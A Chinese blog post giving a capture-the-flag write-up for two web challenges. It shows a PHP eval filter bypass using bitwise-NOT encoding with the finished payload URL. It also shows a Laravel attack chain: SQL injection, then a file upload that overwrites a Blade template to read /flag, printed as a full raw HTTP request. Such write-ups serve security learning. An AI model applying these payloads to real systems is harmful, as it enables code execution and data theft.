---
title: "广东强网杯两道Web Writeup"
date: 2019-09-12T09:06:02+08:00
draft: false
tags: ['ctf']
categories: ['CTF笔记']
---

@level5师傅发在群里的题目，做了两道

<!--more-->

## web4 php

http://119.61.19.212:8082/index.php

```php
<?php
error_reporting(E_ALL^E_NOTICE^E_WARNING);
function GetYourFlag(){
    echo file_get_contents("./flag.php");
}

if(isset($_GET['code'])){
    $code = $_GET['code'];
    //print(strlen($code));
    if(strlen($code)>27){ 
        die("Too Long.");
    }

    if(preg_match('/[a-zA-Z0-9_&^<>"\']+/',$_GET['code'])) {
        die("Not Allowed.");
    }
    @eval($_GET['code']);
}else{
      highlight_file(__FILE__);
}
?>
```

过滤字符数字下划线等等 长度小于等于27 然后调用GetYourFlag()函数即可，可以用`~`按位取反

```php
echo urlencode(~('GetYourFlag'));
```

得到

```php
%B8%9A%8B%A6%90%8A%8D%B9%93%9E%98
```

然后函数需要再取反回来

```php
~(%B8%9A%8B%A6%90%8A%8D%B9%93%9E%98)
```

存到一个变量里，因为过滤，我们用中文来定义变量，我在这用`中`字

```php
echo urlencode('中');	//%E4%B8%AD
```

然后用变量存储我们取反回来的GetYourFlag函数，最后通过变量来调用这个函数

```php
$%E4%B8%AD=~(%B8%9A%8B%A6%90%8A%8D%B9%93%9E%98);$%E4%B8%AD();
```

最后的payload

```
view-source:http://119.61.19.212:8082/index.php?code=$%E4%B8%AD=~(%B8%9A%8B%A6%90%8A%8D%B9%93%9E%98);$%E4%B8%AD();
```

## web5

laravel的代码审计

路由

![20190912093854](https://y4er.com/img/uploads/20190912093854.png)

app/Http/Controllers/UserController.php 注入

![20190912093943](https://y4er.com/img/uploads/20190912093943.png)

![20190912094106](https://y4er.com/img/uploads/20190912094106.png)

密码解不出来，但是在database/factories/UserFactory.php这个工厂函数中给出来了

![20190912095222](https://y4er.com/img/uploads/20190912095222.png)

继续看 app/Http/Controllers/HomeController.php

![20190912094237](https://y4er.com/img/uploads/20190912094237.png)

登录后要从数据库中拿到key，然后才能上传文件，也就是进入`HomeController@uploadss`。传文件的文件名经过一层filecheck()过滤之后移动到视图模板的目录里，清晰了，通过上传覆盖原本的模板然后模板注入读flag。

![20190912094545](https://y4er.com/img/uploads/20190912094545.png)

正好`/resources/views/auth/uploads/`目录有一个`template.blade.php`模板，而路由中也有控制器去渲染这个模板。

![20190912094749](https://y4er.com/img/uploads/20190912094749.png)

![20190912094834](https://y4er.com/img/uploads/20190912094834.png)

构造表单上传之后发现上传filecheck()过滤了很多东西，不能有`php` `<`字样。

首先我们要知道laravel的blade模板是可以自定义php代码的，但是必须是如下格式

```php
@php
    //
@endphp
```

但是过滤了php关键字，没办法，只能去扒一扒blade的文档了，然后发现了自定义模板标签 https://laravel.com/docs/5.8/blade#extending-blade

![20190912095812](https://y4er.com/img/uploads/20190912095812.png)

牛逼，直接@filedata('/flag')就完事了。

```http
POST /home/uploadss/NotAllow6171 HTTP/1.1
Host: 119.61.19.212:8085
Content-Length: 444
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvJNe9ABsnjeKGhDN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Language: zh-CN,zh;q=0.9
Cookie: XSRF-TOKEN=eyJpdiI6IitoWjhwMm1ycmNTWFozSmZTTXJwXC9nPT0iLCJ2YWx1ZSI6IkllczhnNEZodldZbllTN0NmZDErR2I1eXF1bU9mV1wvYklManNuUnQ4YzhJcmlWQ09JVXJPXC9JNHZxVU0xRmdCY0RDbWJHelVwYjQyVjdXQ1FHVlFMMlE9PSIsIm1hYyI6IjNmMGUzZTEwYTA2ZDA2MjJjMDg4OTY5NTI4NDJjNTk2YmQ4N2U4NWYxY2E2ZjU3YWEwNTAwODllMzIyYTU4ZjAifQ%3D%3D; laravel_session=eyJpdiI6InRhRzZmenBJSmFLNHhrb0RlUE5OdVE9PSIsInZhbHVlIjoiZ01qK2JpQURoRHgxbFVrcGc4TE9PK2kycGxSTjlNRzkwK21uVDUxa3UyTW5JYXpIcWJaY2pYbXQwNDc0dklkemNjRmR0aFhZcllmTkRvQXpVUlR3d3c9PSIsIm1hYyI6IjAwMjVkODA3YmY5NDU1Y2U5MDMyMWMwMTI1MTcyMmQ1YTU5NWQzMTE0MGMxMzc0ZWM1NDU4YzQ5MWIyZjI5YTgifQ%3D%3D
Connection: close

------WebKitFormBoundaryvJNe9ABsnjeKGhDN
Content-Disposition: form-data; name="_token"

Z7VZ7FXfNzuzETtQrZ7DeAZCFtbkQl9L8e7ptVin
------WebKitFormBoundaryvJNe9ABsnjeKGhDN
Content-Disposition: form-data; name="files"; filename="template.blade.php"
Content-Type: text/html

@filedata('/flag')
------WebKitFormBoundaryvJNe9ABsnjeKGhDN

Content-Disposition: form-data; name="submit"

Submit
------WebKitFormBoundaryvJNe9ABsnjeKGhDN--
```



**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**